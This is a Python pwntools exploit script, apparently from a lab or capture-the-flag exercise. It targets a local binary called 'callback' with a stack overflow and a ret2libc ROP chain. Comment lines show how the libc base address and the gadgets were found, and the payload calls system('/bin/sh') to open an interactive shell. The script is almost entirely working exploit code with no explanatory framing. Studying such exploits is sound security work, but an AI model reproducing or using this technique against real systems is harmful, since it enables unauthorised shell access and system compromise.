#!/usr/bin/python3

# ldd {vuln} -> /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcb000)
# ps -aux | grep {vuln}
# cat /proc/{pid}/maps
# libc base address: 0x00007ffff7dcb000
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" -> 0x0000000000027c65
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh" -> 0x000000000019604f
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts -> 0x0000000000075b00

# check address:
# xxd -l 8 /lib/x86_64-linux-gnu/libc.so.6
# (gdb) x/2x 0x7ffff7dcb000
# (gdb) x/x 0x7ffff7df2c65 -> 0x0f66c35f
# (gdb) x/x 0x7ffff7f6104f -> 0x6e69622f
# (gdb) x/x 0x7ffff7f61053 -> 0x0068732f
# (gdb) x/x 0x7ffff7e40b00

from pwn import *
from pprint import pprint

def main():
    test_mode = False

    target = ["./callback", "/etc/passwd", "192.168.1.18", "443"]
    offset = 24

    context.arch = "amd64"
    context.update(os = "linux")

    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    elf = ELF(target[0])

    print("-" * 100)
    print("printing symbols")
    print("-" * 100)
    pprint(elf.symbols)
    print("-" * 100)

    rop = ROP(elf)

    rop_libc = ROP(libc)

    BIN_SH = next(libc.search(b"/bin/sh\x00"))
    POP_RDI = rop_libc.find_gadget(["pop rdi", "ret"])[0]
    PUTS_LIBC = libc.symbols["puts"]
    SYSTEM_LIBC = libc.symbols["system"]

    libc_base = 0x7ffff7dcb000
    bin_sh = libc_base + BIN_SH
    pop_rdi = libc_base + POP_RDI
    puts_libc = libc_base + PUTS_LIBC
    system_libc = libc_base + SYSTEM_LIBC

    MAIN = elf.symbols["main"]
    SYS = elf.symbols["sys"]
    EXIT = elf.symbols["exit"]

    print("-" * 100)
    print("main at: " + hex(MAIN))
    print("sys at: " + hex(SYS))
    print("exit at: " + hex(EXIT))
    print("/bin/sh at: " + hex(bin_sh))
    print("pop rdi; ret gadget found at: " + hex(pop_rdi))
    print("puts found at: " + hex(puts_libc))
    print("system at: " + hex(system_libc))
    print("-" * 100)

    rop_leak = p64(pop_rdi) + p64(bin_sh) + p64(puts_libc)
    rop_exec = p64(pop_rdi) + p64(bin_sh) + p64(system_libc)

    rop.call(elf.symbols["sys"])
    rop.call(elf.symbols["exit"])

    test = [
        b"A" * offset,
        rop_leak,
        rop.chain()
    ]

    exploit = [
        b"A" * offset,
        rop_leak,
        rop_exec
    ]

    if test_mode:
        print("test mode")
        print("-" * 100)
        payload = b"".join(test)
    else:
        print("exploit mode")
        print("-" * 100)
        payload = b"".join(exploit)

    p = process(target)

    p.recvuntil("\n")
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
